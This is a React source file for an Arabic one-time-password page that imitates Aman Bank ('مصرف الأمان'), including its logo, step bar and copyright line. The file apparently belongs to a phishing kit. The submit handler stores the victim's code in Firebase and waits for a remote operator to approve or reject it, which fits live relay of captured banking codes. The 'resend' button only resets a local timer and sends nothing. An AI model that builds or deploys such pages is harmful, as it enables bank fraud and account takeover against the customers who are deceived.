import { useState, useEffect, useRef } from "react";
import { useNavigate } from "@/components/TransitionContext";
import { saveOtp, listenForApproval, resetSession, getSessionId } from "@/lib/firebase";

const BLUE  = "#1a3a7a";
const BLUE2 = "#1e4db7";
const GOLD  = "#c8970a";

function StepBar({ active }: { active: number }) {
  const labels = ["بياناتك", "تسجيل الدخول", "التحقق"];
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "20px 28px 8px", gap: 0 }}>
      {labels.map((label, i) => (
        <div key={i} style={{ display: "flex", alignItems: "center", flex: i < labels.length - 1 ? 1 : "none" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 4, flexShrink: 0 }}>
            <div style={{
              width: 32, height: 32, borderRadius: "50%",
              background: i < active ? "#10b981" : i === active ? BLUE : "#e2e8f0",
              color: i <= active ? "white" : "#94a3b8",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontSize: 12, fontWeight: 800,
            }}>
              {i < active ? "✓" : i + 1}
            </div>
            <span style={{ fontSize: 9, fontWeight: 700, color: i <= active ? BLUE : "#94a3b8" }}>{label}</span>
          </div>
          {i < labels.length - 1 && (
            <div style={{ flex: 1, height: 1.5, margin: "0 6px", marginBottom: 16, background: i < active ? "#10b981" : "#e2e8f0", borderRadius: 2 }} />
          )}
        </div>
      ))}
    </div>
  );
}

type PageState = "form" | "waiting" | "approved" | "rejected";

export default function OtpPage() {
  const { navigateTo, navigateBack } = useNavigate();
  const [otp,       setOtp]       = useState("");
  const [timeLeft,  setTimeLeft]  = useState(120);
  const [pageState, setPageState] = useState<PageState>("form");
  const [error,     setError]     = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [refNumber, setRefNumber] = useState("");
  const unsubRef = useRef<(() => void) | null>(null);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const t = setInterval(() => setTimeLeft(s => s - 1), 1000);
    return () => clearInterval(t);
  }, [timeLeft]);

  useEffect(() => { return () => { unsubRef.current?.(); }; }, []);

  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  const onChange = (v: string) => {
    if (!/^\d*$/.test(v)) return;
    const trimmed = v.slice(0, 6);
    setOtp(trimmed);
    if (submitted) setError(trimmed.length >= 4 ? "" : "أدخل رمزاً مكوناً من 4 إلى 6 أرقام");
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    if (timeLeft <= 0) { setError("انتهت مدة الرمز. اضغط على إعادة الإرسال"); return; }
    if (otp.length < 4) { setError("أدخل رمزاً مكوناً من 4 إلى 6 أرقام"); return; }
    setError("");
    await saveOtp(otp).catch(console.error);
    setPageState("waiting");
    unsubRef.current = listenForApproval((approved) => {
      if (approved === true) {
        unsubRef.current?.();
        const sid = getSessionId();
        const ref = "AMN-" + sid.slice(-8).toUpperCase();
        setRefNumber(ref);
        setPageState("approved");
        resetSession();
        setTimeout(() => navigateTo("/"), 5000);
      } else if (approved === false) {
        unsubRef.current?.();
        setPageState("rejected");
      }
    });
  };

  const handleRetry = () => {
    setPageState("form"); setOtp(""); setSubmitted(false); setError(""); setTimeLeft(120);
  };

  const isComplete = otp.length >= 4;

  /* ── Waiting ── */
  if (pageState === "waiting") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#0d2660,${BLUE},${BLUE2})`, fontFamily: "'Cairo',sans-serif", padding: "0 32px", textAlign: "center" }}>
        <div style={{ position: "relative", width: 96, height: 96, marginBottom: 32 }}>
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid rgba(255,255,255,0.1)" }} />
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid transparent", borderTopColor: "#f5d06e", animation: "ab-spin 1s linear infinite" }} />
          <div style={{ position: "absolute", inset: 14, borderRadius: "50%", background: "rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 28 }}>🔐</div>
        </div>
        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 28px" }}>جارٍ التحقق من الرمز</h2>
        <div style={{ display: "flex", gap: 8 }}>
          {[0,1,2,3].map(i => <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: "#f5d06e", animation: "ab-dot 1.2s ease-in-out infinite", animationDelay: `${i * 0.18}s` }} />)}
        </div>
      </div>
    );
  }

  /* ── Approved ── */
  if (pageState === "approved") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "linear-gradient(160deg,#064e3b,#065f46,#059669)", fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 28px" }}>
        <div style={{ position: "relative", width: 110, height: 110, marginBottom: 32 }}>
          {[0,1,2].map(i => <div key={i} style={{ position: "absolute", inset: i * 10, borderRadius: "50%", border: `2px solid rgba(255,255,255,${0.25 - i * 0.07})`, animation: "ab-ring 2.4s ease-out infinite", animationDelay: `${i * 0.4}s` }} />)}
          <div className="ab-scale-in" style={{ position: "absolute", inset: 0, borderRadius: "50%", background: "rgba(255,255,255,0.18)", border: "3px solid rgba(255,255,255,0.5)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 46, boxShadow: "0 8px 40px rgba(0,0,0,0.3)" }}>✅</div>
        </div>
        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 26, fontWeight: 900, margin: "0 0 8px", letterSpacing: 0.5 }}>تم التسجيل بنجاح!</h2>
        <p style={{ color: "rgba(220,255,240,0.85)", fontSize: 14, lineHeight: 1.9, margin: "0 0 32px" }}>مرحباً بك في مصرف الأمان<br />تم تأكيد تسجيلك بنجاح</p>
        <div style={{ background: "rgba(255,255,255,0.12)", border: "1.5px solid rgba(255,255,255,0.25)", borderRadius: 18, padding: "20px 32px", marginBottom: 28, backdropFilter: "blur(8px)", minWidth: 260 }}>
          <p style={{ color: "rgba(220,255,240,0.7)", fontSize: 11, fontWeight: 700, margin: "0 0 8px", letterSpacing: 1 }}>رقم المرجع</p>
          <p style={{ color: "white", fontSize: 22, fontWeight: 900, fontFamily: "monospace", letterSpacing: 3, margin: 0 }}>{refNumber}</p>
          <p style={{ color: "rgba(220,255,240,0.6)", fontSize: 10, margin: "8px 0 0" }}>يُرجى الاحتفاظ بهذا الرقم للمراجعة</p>
        </div>
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          {[0,1,2,3].map(i => <div key={i} style={{ width: 7, height: 7, borderRadius: "50%", background: "rgba(255,255,255,0.7)", animation: "ab-dot 1.2s ease-in-out infinite", animationDelay: `${i * 0.18}s` }} />)}
        </div>
        <p style={{ color: "rgba(220,255,240,0.5)", fontSize: 11, marginTop: 10 }}>جارٍ إعادة التوجيه...</p>
      </div>
    );
  }

  /* ── Rejected ── */
  if (pageState === "rejected") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "linear-gradient(160deg,#450a0a,#7f1d1d,#991b1b)", fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 32px" }}>
        <div className="ab-scale-in" style={{ width: 96, height: 96, borderRadius: "50%", background: "rgba(255,255,255,0.1)", border: "3px solid rgba(255,100,100,0.5)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 44, marginBottom: 24, boxShadow: "0 8px 40px rgba(0,0,0,0.4)" }}>❌</div>
        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 22, fontWeight: 900, margin: "0 0 10px" }}>رمز التحقق غير صحيح</h2>
        <p style={{ color: "rgba(255,200,200,0.8)", fontSize: 13, lineHeight: 1.8, marginBottom: 32 }}>الرمز الذي أدخلته غير صحيح أو منتهي الصلاحية.<br />يرجى المحاولة مرة أخرى.</p>
        <button onClick={handleRetry} style={{ padding: "14px 40px", borderRadius: 10, background: "rgba(255,255,255,0.15)", border: "1.5px solid rgba(255,255,255,0.3)", color: "white", fontSize: 15, fontWeight: 800, cursor: "pointer", fontFamily: "'Cairo',sans-serif" }}>
          إعادة المحاولة
        </button>
      </div>
    );
  }

  /* ── OTP Form ── */
  return (
    <div dir="rtl" style={{ fontFamily: "'Cairo',sans-serif", maxWidth: 480, margin: "0 auto", minHeight: "100vh", background: "white" }}>

      {/* Navbar */}
      <nav style={{ background: "white", borderBottom: "1px solid #e8eef5", display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 16px", direction: "ltr" }}>
        <button onClick={() => navigateBack()} style={{ background: "none", border: "none", cursor: "pointer", padding: 4, display: "flex", alignItems: "center", color: BLUE }}>
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="15 18 9 12 15 6" />
          </svg>
        </button>
        <img src="/aman-bank-logo.png" alt="مصرف الأمان" style={{ height: 48 }} />
      </nav>

      {/* StepBar */}
      <StepBar active={2} />

      {/* Form */}
      <form onSubmit={submit} noValidate style={{ padding: "12px 24px 32px" }}>

        {/* Instruction */}
        <p style={{ textAlign: "center", color: "#475569", fontSize: 13, lineHeight: 1.7, margin: "0 0 28px" }}>
          أدخل رمز التأكيد<br />المرسل إلى هاتفك المحمول
        </p>

        {/* OTP input */}
        <div style={{ marginBottom: 8 }}>
          <input
            type="text" inputMode="numeric" maxLength={6} value={otp} dir="ltr"
            onChange={e => onChange(e.target.value)}
            placeholder="• • • • • •"
            style={{
              width: "100%", height: 64, textAlign: "center",
              fontSize: 28, fontWeight: 800, letterSpacing: 14,
              borderRadius: 10,
              border: `2px solid ${otp.length >= 4 ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
              background: submitted && error && otp.length < 4 ? "#fff5f5" : "#f8faff",
              color: BLUE, outline: "none", fontFamily: "monospace",
              transition: "all 0.18s", boxSizing: "border-box",
            }}
          />
        </div>

        {error && <p style={{ color: "#ef4444", fontSize: 12, textAlign: "center", fontWeight: 700, margin: "8px 0 0" }}>{error}</p>}

        {/* Timer row */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", margin: "20px 0 16px" }}>
          <button type="button" disabled={timeLeft > 0}
            onClick={() => { setTimeLeft(120); setError(""); setSubmitted(false); setOtp(""); }}
            style={{ background: "none", border: "none", fontWeight: 700, fontSize: 13, cursor: timeLeft > 0 ? "not-allowed" : "pointer", color: timeLeft > 0 ? "#cbd5e1" : BLUE, fontFamily: "'Cairo',sans-serif" }}>
            إعادة الإرسال
          </button>
          <div style={{ padding: "7px 14px", borderRadius: 8, fontFamily: "monospace", fontWeight: 800, fontSize: 14, background: timeLeft > 30 ? "#f0f4ff" : timeLeft > 0 ? "#fff5f5" : "#fee2e2", color: timeLeft > 30 ? BLUE : "#ef4444", border: `1.5px solid ${timeLeft > 30 ? "#dde4f0" : "#fca5a5"}` }}>
            {timeLeft > 0 ? fmt(timeLeft) : "انتهى ⚠️"}
          </div>
        </div>

        {timeLeft <= 0 && (
          <div style={{ background: "#fff5f5", border: "1px solid #fca5a5", borderRadius: 8, padding: "11px 14px", marginBottom: 16, textAlign: "right" }}>
            <p style={{ color: "#ef4444", fontSize: 12, margin: 0, lineHeight: 1.7 }}>انتهت صلاحية الرمز. اضغط على "إعادة الإرسال" للحصول على رمز جديد.</p>
          </div>
        )}

        {/* Submit */}
        <button type="submit"
          style={{ width: "100%", padding: "15px 0", borderRadius: 8, fontWeight: 800, fontSize: 15, color: "white", border: "none", cursor: isComplete && timeLeft > 0 ? "pointer" : "not-allowed", background: isComplete && timeLeft > 0 ? BLUE : "#9fb3d4", fontFamily: "'Cairo',sans-serif", letterSpacing: 0.3 }}>
          تأكيد ✓
        </button>
      </form>

      <p style={{ textAlign: "center", color: "#94a3b8", fontSize: 11, padding: "0 0 24px" }}>© 2019 مصرف الأمان — جميع الحقوق محفوظة</p>
    </div>
  );
}
